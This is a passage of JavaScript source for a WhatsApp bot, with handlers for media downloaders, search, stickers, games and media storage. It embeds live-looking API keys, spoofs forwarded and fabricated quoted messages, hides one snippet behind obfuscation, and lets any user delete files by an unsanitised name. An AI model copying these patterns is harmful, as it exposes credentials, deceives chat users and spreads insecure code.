              data = await fetchJson(`https://api.lolhuman.xyz/api/tiktok?apikey=${lolkey}&url=${q}`)
              result = `⚜️ *Nickname*: ${data.result.author.nickname}\n❤️ *Like*: ${data.result.statistic.diggCount}\n💬 *Comment*: ${data.result.statistic.commentCount}\n🔁 *Share*: ${data.result.statistic.shareCount}\n🎞️ *Views*: ${data.result.statistic.playCount}\n📑 *Desc*: ${data.result.title}`
              buttons = [{buttonId: `${prefix}buttons3 ${q}`,buttonText:{displayText: `▶️ Video`},type:1},{buttonId:`${prefix}buttons4 ${q}`,buttonText:{displayText:'🎵 Audio'},type:1}]
              fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(data.result.thumbnail))
              imageMsg = ( await bosco.prepareMessage(from, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
              buttonsMessage = {footerText:'Choose a format below', imageMessage: imageMsg,
              contentText:`${result}`,buttons,headerType:4}
              prep = await bosco.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              bosco.relayWAMessage(prep)
              fs.unlinkSync(`./${sender}.jpeg`)
              break
      case 'ttnowm': 
      case 'tiktoknowm':
             if (!q) return reply('The link?')
             if (!q.includes('tiktok')) return reply(mess.error.Iv)
             reply(mess.wait)
             anu = await TiktokDownloader(`${q}`)
            .then((data) => { sendMediaURL(from, data.result.nowatermark) })
            .catch((err) => { reply(String(err)) })
             break
      case 'ttaudio': 
      case 'tiktokmusic': 
      case 'tiktokaudio':
             if (args.length == 0) return reply(`Example: ${prefix + command} https://vt.tiktok.com/ZSwWCk5o/`)
             ini_link = args[0]
             get_audio = await getBuffer(`https://api.lolhuman.xyz/api/tiktokmusic?apikey=${lolkey}&url=${ini_link}`)
             bosco.sendMessage(from, get_audio, audio, { mimetype: Mimetype.mp4Audio, quoted: mek })
             break
      case 'google':
              if (!q) return reply(mess.wrongFormat)
              ss = await getBuffer(`https://api.apiflash.com/v1/urltoimage?access_key=f3fce33fa6804c0b97c897b3bd2ec7a8&url=https://google.com/search?q=${q}`)
              if(q == undefined || q == ' ') return reply(`*Search result : ${q}* not found`)
              googleIt({ 'query': q }).then(results => {
              vars = `_*Search result : ${q}*_\n`
              for (let i = 0; i < results.length; i++) {
              vars +=  `\n━━━━━━━━━━━━━━━━━\n\n*Title:* ${results[i].title}\n\n*Description:* ${results[i].snippet}\n\n*Link:* ${results[i].link}\n`
               }
               bosco.sendMessage(from, ss, image, {caption: vars, quoted : mek, thumbnail: Buffer.alloc(0) })
               }).catch(e => {
               console.log(e)
               reply(`${e}`)
               })
               break
       case 'tinyurl':
                 try {
                 link = args[0]
                 anu = await axios.get(`https://tinyurl.com/api-create.php?url=${link}`)
                 reply(`${anu.data}`)
                  } catch (e) {
                 emror = String(e)
                 reply(`${e}`)
                 }
               break
        case 'mediafire':
               if (args.length < 1) return reply('*Where is the link?*')
               if(!isUrl(args[0]) && !args[0].includes('mediafire')) return reply(mess.error.Iv)
               teks = args.join(' ')
               res = await mediafireDl(teks)
               result = `*MediaFire Downloader*
      
📜 Name : ${res[0].nama}
💡 Size : ${res[0].size}
🖇️ Link : ${res[0].link}
*_please wait_*`
             reply(result)
             sendFileFromUrl(res[0].link, document, {mimetype: res[0].mime, filename: res[0].nama, quoted: mek})
             break
      case 'fb':
      case 'facebook':
             if (args.length == 0) return reply(`Ex:- ${prefix}fb Legend `)
             if (!q) return
             reply(mess.wait)
             try {
             anu = await fetchJson(`https://zenzapi.xyz/api/downloader/facebook?url=${args[0]}&apikey=a10523bcf6`)
             sendMediaURL(from, anu.result.hd)
             } catch (e) {
             console.log(e)
             reply(`${e}`)
             }
             break
      case 'twitter':
             if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return reply(mess.Iv)
             if (!q) return reply('the link?')
             ten = args[0]
             var res = await twitterGetUrl(`${ten}`)
            .then(g => {
             ren = `${g.download[2].url}`
             sendMediaURL(from,ren,'Done')
             })
             break
      case 'lyric':
               if (!q) return reply(mess.wrongFormat)
               reply(mess.wait)
               lirikLagu(q).then((res) => {
               let lirik = `song lyrics ${q}

               ${res[0].result}
`
               reply(lirik)
})
               break
      case 'playstore':
              try {
              if (args.length == 0) return reply(`Send orders *${prefix}playstore [ apk ]*\nExample : ${prefix}playstore pubg`)
              query = args.join(" ")
              reply(mess.wait)
              get_result = await fetchJson(`https://api.zeks.xyz/api/sgplay?apikey=${zekskey}&q=${query}`)
              get_result = get_result.result
              teks = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
▯ *PLAYSTORE*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Successfully Obtained!*\n`
for(let i = 0; i < get_result.length; i++) {
teks += `*▢ Title : ${get_result[i].title}*
*▢ Price : ${get_result[i].price}*
*▢ Rate : ${get_result[i].rating}*
*▢ Link : ${get_result[i].url}*

`
}
              ini_buffer = await getBuffer(get_result[0].thumb)
              bosco.sendMessage(from, ini_buffer, image, { quoted: mek, caption: teks })
              } catch {
              reply(`Sorry app ${query} not found`)
}
              break
      case 'ytdesc':
             if (args.length < 1) return reply('*Where is  Yt Video/Link?*')
             teks = args.join(' ')
             res = await yts(teks)
             reply(res.all[0].description)
             break
      case 'buttons1':
              if (args.length < 1) return reply('*Where is  link?*')
              if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)
              teks = args.join(' ')
              res = await y2mateA(teks)
              sendFileFromUrl(res[0].link, document, {quoted: mek, mimetype: 'audio/mp3', filename: res[0].output})
              break
     case 'buttons2':
              if (args.length < 1) return reply('Link Nya Mana?')
              if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)
              teks = args.join(' ')
              res = await y2mateV(teks)
              sendFileFromUrl(res[0].link, video, {quoted: mek, mimetype: 'video/mp4', filename: res[0].output})
              break
     case 'buttons3': 
             if (!q) return reply('*Where is  link?*')
             if (!q.includes('tiktok')) return reply(mess.error.Iv)
             data = await fetchJson(`https://api.lolhuman.xyz/api/tiktok?apikey=${lolkey}&url=${q}`)
             ini_video = await getBuffer(data.result.link)
             bosco.sendMessage(from, ini_video, video, { quoted: mek })
             break
      case 'buttons4': 
             if (!q) return reply('*Where is the link?*')
             if (!q.includes('tiktok')) return reply(mess.error.Iv)
             data = await getBuffer(`https://api.lolhuman.xyz/api/tiktokmusic?apikey=${lolkey}&url=${args[0]}`)
             bosco.sendMessage(from, data, audio, { quoted: mek })
             break
      case 'alive':
              bosco1 = await bosco.prepareMessage(from, denis, location, {thumbnail: denis})
              bosco2 = bosco1.message["ephemeralMessage"] ? bosco1.message.ephemeralMessage : bosco1
              groups = bosco.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = bosco.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
              charger = `${charging ? 'charging' : 'not charging'}`
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await bosco.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
teks = `
*ivde okk thanne und bro :)*
*Sᴘᴇᴇᴅ :* ${latensie.toFixed(4)} Second
*Rᴀᴍ Usᴀɢᴇ :* ${ram2}
*Bᴀᴛᴛᴇʀʏ :* ${baterai}% ${charger}
*Pʟᴀᴛғᴏʀᴍ :* ${os.platform()}
*Uᴘᴛɪᴍᴇ :* ${runtime(process.uptime())}
*Wᴀ ᴠᴇʀsɪᴏɴ :* ${bosco.user.phone.wa_version}
*Os ᴠᴇʀsɪᴏɴ :* ${bosco.user.phone.os_version}
*Dᴇᴠɪᴄᴇ Mᴀɴᴜғᴀᴄᴛᴜʀᴇ :* ${bosco.user.phone.device_manufacturer}
*Dᴇᴠɪᴄᴇ Mᴏᴅᴇʟ :* ${bosco.user.phone.device_model}
`
    menubutton = [{buttonId:`${prefix}credits`,buttonText:{displayText:'CREDITS'},type:1}
]
 menumessage = { contentText: `${teks}`, footerText: `follw my ig a_s_l_a_m_._x`, buttons: menubutton, headerType: 6, locationMessage: bosco2.message.locationMessage}
 bosco.sendMessage(from, menumessage, MessageType.buttonsMessage)
             break  
      case 'make':
              const mathdare = dare[Math.floor(Math.random() * (dare.length))]
              result = `${mathdare}`
              buttons = [{buttonId: `${prefix}sc`,buttonText:{displayText: 'SC'},type:1},{buttonId:`${prefix}make1`,buttonText:{displayText:'MAKE ONE'},type:1},{buttonId:`${prefix}alive`,buttonText:{displayText:'ALIVE'},type:1}]
              buttonsMessage = { contentText: `${result}`, footerText: 'Truth or challenge?', buttons: buttons, headerType: 1 }
              prep = await bosco.prepareMessageFromContent(from,{buttonsMessage},{})
              bosco.relayWAMessage(prep)
              break
      case 'buttons6':
              const randomtruth = truth[Math.floor(Math.random() * truth.length)]
              result = `${randomtruth}`
              buttons = [{buttonId: `${prefix}buttons6`,buttonText:{displayText: 'Truth'},type:1},{buttonId:`${prefix}buttons5`,buttonText:{displayText:'Dare'},type:1},{buttonId:`${prefix}tod`,buttonText:{displayText:'Tod'},type:1}]
              buttonsMessage = { contentText: `${result}`, footerText: 'Truth or challenge?', buttons: buttons, headerType: 1 }
              prep = await bosco.prepareMessageFromContent(from,{buttonsMessage},{})
              bosco.relayWAMessage(prep)
              break
       
         case 'antilink':
              if (!isGroup) return reply(mess.group)
              if (!isBotGroupAdmins) return reply(`*Bot Must be Admin*`)
              if (!q) return reply(`*Select enable or disable*`)
              if (args[0].toLowerCase() === 'enable'){
              if (isAntiLink) return reply(`*Already active*`)
              antilink.push(from)
              fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
              reply('*「 ANTILINK ON AAKI 」*\n\nThose who send the group link will be kicked!')
              } else if (args[0].toLowerCase() === 'disable'){
              let anu = antilink.indexOf(from)
              antilink.splice(anu, 1)
              fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
              reply('*「 ANTI LINK OF AAKI」*')
              } else {
              reply(`*Select enable or disable*`)
}
              break
       case 'antibule':
					if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
			if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (args.length < 1) return reply(`untuk mengaktifkan ketik : ${prefix}antibule 1`)
				    if (Number(args[0]) === 1) {
						if (isKickArea) return reply('ᴀʟʀᴇᴀᴅʏ ᴀᴄᴛɪᴠᴇ')
						kickarea.push(from)
						fs.writeFileSync('./database/kickarea.json', JSON.stringify(kickarea))
						sendFakeStatus(from, `sᴜᴄᴄᴇss`, fake)
			  } else if (Number(args[0]) === 0) {
						if (!isKickArea) return reply('ᴀʟʀᴇᴀᴅʏ ᴅᴇᴀᴅ')
						kickarea.splice(from, 1)
						fs.writeFileSync('./database/kickarea.json', JSON.stringify(kickarea))
						sendFakeStatus(from, `sᴜᴄᴄᴇss`, fake)
					} else {
						reply('1 ᴛᴏ ᴛᴜʀɴ ᴏɴ, 0 ᴛᴏ ᴛᴜʀɴ ᴏғғ')
					}
						break

 //------------------< Extra >-------------------
 
       case 'brainly':
             brainly(args.join(" ")).then(res => {
             hmm = '▭▭▭▭▭▭▭▭▭▭▭▭\n'
             for (let Y of res.data) {
             hmm += `\n*「 _BRAINLY_ 」*\n\n*➸ Question:* ${Y.pertanyaan}\n\n*➸ Answer:* ${Y.jawaban[0].text}\n▭▭▭▭▭▭▭▭▭▭▭\n`
}
             reply(hmm)
             console.log(res)
})
             break
       case 'ss':
				reply(mess.wait)
					sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/ssweb?url=${args[0]}&apikey=${HunterApi}`)
					break
        case 'ocr': 
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
			        const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
				    const media = await bosco.downloadAndSaveMediaMessage(encmedia)
					reply(mess.wait)
					await recognize(media, {lang: 'eng+ind', oem: 1, psm: 3})
					.then(teks => {
					reply(teks.trim())
					fs.unlinkSync(media)
					})
					.catch(err => {
					reply(err.message)
					fs.unlinkSync(media)
					})
					} else {
						reply(`*Send Photos With Caption ${prefix}ocr*`)
					}
					break
      case 'tod':
              result =`*Truth Or Dare*\nPlayers are given the choice between answering questions honestly, or taking on the challenge given`
              buttons = [{buttonId: `${prefix}buttons6`,buttonText:{displayText: 'Truth'},type:1},{buttonId:`${prefix}buttons5`,buttonText:{displayText:'Dare'},type:1},{buttonId:`${prefix}tod`,buttonText:{displayText:'Tod'},type:1}]
              buttonsMessage = { contentText: `${result}`, footerText: 'Truth or challenge?', buttons: buttons, headerType: 1 }
              prep = await bosco.prepareMessageFromContent(from,{buttonsMessage},{})
              bosco.relayWAMessage(prep)
              break
        case 'anime':
              let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data
              let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
              fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(wipi))
		      buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `next`},type:1},{buttonId:`${prefix}owner`,buttonText:{displayText:'owner'},type:1}]
              imageMsg = ( await bosco.prepareMessage(from, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
              buttonsMessage = {footerText:'© 𝚖𝚊𝚍𝚎 𝚋𝚢 TEDZO', imageMessage: imageMsg,
              contentText:`_Click Next to go to the next picture_`,buttons,headerType:4}
              prep = await bosco.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              bosco.relayWAMessage(prep)
              fs.unlinkSync(`./${sender}.jpeg`)
              break
        case 'song':
        case 'play':
               if (args.length < 1) return reply('*What do you want to search?*')
               teks = args.join(' ')
               if (!teks.endsWith("-doc")){
               res = await yts(`${teks}`).catch(e => {
               reply('*The Query Error You Entered Does Not Exist*')
               })
               let songs = `.•♫•♬• Playing ${res.all[0].title} •♬•♫•.`
               res = await y2mateA(res.all[0].url).catch(e => {
               reply('Error When Entering Y2mate Web')
               })
               var _0x2c75a0=_0x4d6d;function _0x4d6d(_0x2b1769,_0x21c3c2){var _0x153505=_0x1535();return _0x4d6d=function(_0x4d6d8d,_0x40af97){_0x4d6d8d=_0x4d6d8d-0xed;var _0x36b55b=_0x153505[_0x4d6d8d];return _0x36b55b;},_0x4d6d(_0x2b1769,_0x21c3c2);}function _0x1535(){var _0x24fca7=['390232xVQaKf','link','8rImlLB','3gfkzDQ','▢\x20Mᴀᴅᴇ\x20Bʏ\x20Wɪᴛʜ\x20Pᴇᴘᴇ\x20▢','https://youtu.be/OuYArP4quSA','5976270lAwpRH','6486516WpxoaX','5501440ZANpfi','2204027fHMkvQ','552FJxEKq','6076480iuGcuq','output','1626lOzEoW','audio/mp4'];_0x1535=function(){return _0x24fca7;};return _0x1535();}(function(_0x1cbcd6,_0x679289){var _0x286c3a=_0x4d6d,_0x39ba5b=_0x1cbcd6();while(!![]){try{var _0x27ca30=parseInt(_0x286c3a(0xf5))/0x1*(parseInt(_0x286c3a(0xf2))/0x2)+-parseInt(_0x286c3a(0xf0))/0x3*(-parseInt(_0x286c3a(0xed))/0x4)+parseInt(_0x286c3a(0xfa))/0x5+-parseInt(_0x286c3a(0xf8))/0x6+-parseInt(_0x286c3a(0xfb))/0x7+parseInt(_0x286c3a(0xf4))/0x8*(parseInt(_0x286c3a(0xf9))/0x9)+-parseInt(_0x286c3a(0xee))/0xa;if(_0x27ca30===_0x679289)break;else _0x39ba5b['push'](_0x39ba5b['shift']());}catch(_0x24cdd9){_0x39ba5b['push'](_0x39ba5b['shift']());}}}(_0x1535,0x895aa),sendFileFromUrl(res[0x0][_0x2c75a0(0xf3)],audio,{'quoted':mek,'thumbnail':denis,'contextInfo':{'externalAdReply':{'title':''+songs,'body':_0x2c75a0(0xf6),'mediaType':0x2,'mediaUrl':_0x2c75a0(0xf7),'thumbnail':denis},'mimetype':_0x2c75a0(0xf1),'filename':res[0x0][_0x2c75a0(0xef)]}}));
               }
               if (teks.endsWith("-doc")){
               const tec = teks.split("-doc")
               res = await yts(`${tec}`).catch(e => {
               reply('*The Query Error You Entered Does Not Exist*')
               })
               reply(`.•♫•♬• Playing ${res.all[0].title} •♬•♫•.`)
               let thumbInfo = `
📜 Tɪᴛʟᴇ : ${res.all[0].title}
🎁 Tʏᴘᴇ : mp3
📬 Iᴅ : ${res.all[0].videoId}
🌐 Pᴜʙʟɪᴄᴀᴛɪᴏɴ : ${res.all[0].ago}
🎞️ Wᴀᴛᴄʜᴇᴅ : ${res.all[0].views}
⚖️ Dᴜʀᴀᴛɪᴏɴ : ${res.all[0].timestamp}
🎥 Cʜᴀɴɴᴇʟ : ${res.all[0].author.name}
🖇️ Lɪɴᴋ : ${res.all[0].author.url}
🔧 BY :TEDZO

*Pʟᴇᴀsᴇ Wᴀɪᴛ Sᴏɴɢ Lᴏᴀᴅɪɴɢ....*`

               sendFileFromUrl(res.all[0].image, image, {quoted: mek, thumbnail: Buffer.alloc(0), caption: thumbInfo})
               res = await y2mateA(res.all[0].url).catch(e => {
               reply('*Error When Entering Y2mate Web*')
               })
               sendFileFromUrl(res[0].link, document, {quoted: mek, mimetype: 'audio/mp3', filename: res[0].output})
               }
               break
            case 'totag':
			if (!isGroup) return reply(`*Send Only Group*`)
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await bosco.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await bosco.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            bosco.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await bosco.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await bosco.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            bosco.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await bosco.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await bosco.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'audio/mp4', duration: 999999999,
                ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            bosco.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
         } else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await bosco.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await bosco.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/gif',
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            bosco.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedDocument) && args.length == 0) {
            encmedia = isQuotedDocument ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await bosco.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await bosco.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'text/plain',
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            bosco.sendMessage(from, ini_buffer, document, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await bosco.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await bosco.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/mp4', duration: 999999999,
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            bosco.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          reply(`*Reply to Gif/Document/Audio/Video/Sticker Send Caption With ${prefix}totag*`)
        }
        break
         case 'forward':
           if (!isOwner) return reply(mess.only.owner)
	        bosco.sendMessage(from, `${body.slice(8)}`, MessageType.text, { sendEphemeral: true, thumbnail: fs.readFileSync('./ds.jpg', 'base64'), contextInfo: { forwardingScore: 2, isForwarded: true }})
            break
		   case 'forwardaudio':                 
	                encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo	
                 	media = await bosco.downloadAndSaveMediaMessage(encmedia)
	                	ran = getRandom('.mp3')
	                	exec(`ffmpeg -i ${media}  ${ran}`, (err, stderr, stdout) => {
	                	fs.unlinkSync(media)
	                	if (err) return reply('Error!')
		                hah = fs.readFileSync(ran)
	                	bosco.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek, sendEphemeral: true, contextInfo: { forwardingScore: 508, isForwarded: true }})
	                	fs.unlinkSync(ran)
   	                 })
   	                	break

            case 'forwardvideo':
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await bosco.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media}  ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return reply('Error!')
            buffer453 = fs.readFileSync(ran)
            bosco.sendMessage(from, buffer453, video, {mimetype: 'video/mp4', quoted: mek, sendEphemeral: true, contextInfo: { forwardingScore: 508, isForwarded: true }})
            fs.unlinkSync(ran)
            })
            break
          case 'fw':
bosco.sendMessage(from, `${args.join(' ')}`, MessageType.text, {contextInfo: { forwardingScore: 210, isForwarded: true }})
            break

//------------------< Sticker Maker >-------------------

case 'attp':
              if (args.length == 0) return reply(`Example: ${prefix + command} bosco`)
              buffer = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}`)
              bosco.sendMessage(from, buffer, sticker, { quoted: mek })
              break
       case 'sticker':
       case 'stiker':
       case 's':
       case 'stickergif':
       case 'stikergif':
       case 'sgif':
              if (isAuto) return
              if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
              encmediat = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
              mediat = await bosco.downloadAndSaveMediaMessage(encmediat)
              ron = getRandom('.webp')
              exec(`ffmpeg -i ${mediat} -vf "scale=512:512:force_original_aspect_ratio=increase,fps=15, crop=512:512" ${ron}`, (err) => {
              fs.unlinkSync(mediat)
              if (err) return reply(`${err}`)
              exec(`webpmux -set exif ${addMetadata('Denis')} ${ron} -o ${ron}`, async (error) => {
              if (error) return reply(`${error}`)
              bosco.sendMessage(from, fs.readFileSync(ron), sticker, {quoted:mek})
              fs.unlinkSync(ron)
})
})
              } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
              encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
              mediat = await bosco.downloadAndSaveMediaMessage(encmedia)
              ron = getRandom('.webp')
              exec(`ffmpeg -i ${mediat} -vf "scale=512:512:force_original_aspect_ratio=increase,fps=15, crop=512:512" ${ron}`, (err) => {
              fs.unlinkSync(mediat)
              if (err) return reply(`${err}`)
              exec(`webpmux -set exif ${addMetadata('Denis')} ${ron} -o ${ron}`, async (error) => {
              if (error) return reply(`${error}`)
              bosco.sendMessage(from, fs.readFileSync(ron), sticker, {quoted:mek})
              fs.unlinkSync(ron)
})
})
              } else {
              reply(`*_Send an image with the caption ${prefix}sticker_*\n*_Sticker Video Duration 1-9 Seconds_*`)
}
              break
case 'emoji':
			if (!q) return fakegroup('*emoji where..?*')
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[4].url}`
    		sendStickerFromUrl(from,`${teks}`)	
    		console.log(teks)
   			})
    		break

//------------------< Storage >-------------------

                   case 'addvn':
      case 'addbgm':
                    if (!isOwner) return 
					if (!isQuotedAudio) return reply('*Reply to Audio*')
					nm = body.slice(7)
					if (!nm) return reply('*What is The bgm name?*')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await bosco.downloadMediaMessage(boij)
					vien.push(`${nm}`)
					fs.writeFileSync(`./media/vn/${nm}.mp3`, delb)
					fs.writeFileSync('./database/vien.json', JSON.stringify(vien))
					bosco.sendMessage(from, `*Bgm Added*`, MessageType.text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: 'status@broadcast' } : {})}, message: { orderMessage: { itemCount: 333, status: 200, thumbnail: fs.readFileSync('./ds.jpg'), surface: 200, message: `${nm}`, orderTitle: 'hehe', sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true,sourceUrl:"https://youtu.be/b-Rr0XCo7YU"}})
					break
	 case 'delvn':
					try {
					 nmm = body.slice(7)
					 wanu = vien.indexOf(nmm)
					 vien.splice(wanu, 1)
					 fs.unlinkSync(`./media/vn/${nmm}.mp3`)
					bosco.sendMessage(from, `*Bgm Deleted*`, MessageType.text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: 'status@broadcast' } : {})}, message: { orderMessage: { itemCount: 59, status: 200, thumbnail: fs.readFileSync('./ds.jpg'), surface: 200, message: '𝒑𝒆𝒑𝒆', orderTitle: '𝒔𝒆𝒓', sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}})
					} catch (err){
						console.log(err)
						reply(mess.error.api)
					}
					break
				case 'vnlist':
				case 'listbgm':
					case 'listvn':
					teks = '*Lɪsᴛ Bɢᴍ :*\n'
					for (let awokwkwk of vien) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Tᴏᴛᴀʟ : ${vien.length}*\n\n_🍁_`
					bosco.sendMessage(from, teks.trim(), extendedText, { caption: 'teks', "contextInfo": { text: 'teks', sendEphemeral: true, "externalAdReply": { "title": `${' '}𝒑𝒆𝒑𝒆 𝒔𝒆𝒓${''}${''}`, "body": ``, "previewType": 'PHOTO', "thumbnailUrl": `${'https://i.ibb.co/vkkcm0L/034c588fd8d5.jpg'}`, "thumbnail": '', "sourceUrl": `${'https://wa.me/c/919633687665'}`}},quoted: ftext})
					break
				case 'addimage':
				    if (!isOwner) return
					if (!isQuotedImage) return reply('*Reply image*')
					nm = body.slice(10)
					if (!nm) return reply('*Whats the name of the image?*')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await bosco.downloadMediaMessage(boij)
					imagi.push(`${nm}`)
					fs.writeFileSync(`./media/image/${nm}.jpg`, delb)
					fs.writeFileSync('./database/imagi.json', JSON.stringify(imagi))
					bosco.sendMessage(from, `*Image Added*`, MessageType.text, { quoted: mek })
					break
				case 'delimage':
					try {
					 nmm = body.slice(10)
					 wanu = imagi.indexOf(nmm)
					 imagi.splice(wanu, 1)
					 fs.unlinkSync(`./media/image/${nmm}.jpg`)
					 costum(from, 'Image Deleted', fake)
					} catch (err){
						console.log(err)
						reply(mess.error.api)
					}
					break
					case 'imagelist':
				case 'listimage':
					teks = '*Image List :*\n\n'
					for (let awokwkwk of imagi) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${imagi.length}*\n\n_To take an image please reply to This message With the caption of the image name_`
					bosco.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": imagi } })
					break
              case 'addsticker':
                    if (!isOwner) return
					if (!isQuotedSticker) return reply('*Reply To Sticker*')
					nm = body.slice(12)
					if (!nm) return reply('*Sticker Name?*')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await bosco.downloadMediaMessage(boij)
					setik.push(`${nm}`)
					fs.writeFileSync(`./media/sticker/${nm}.webp`, delb)
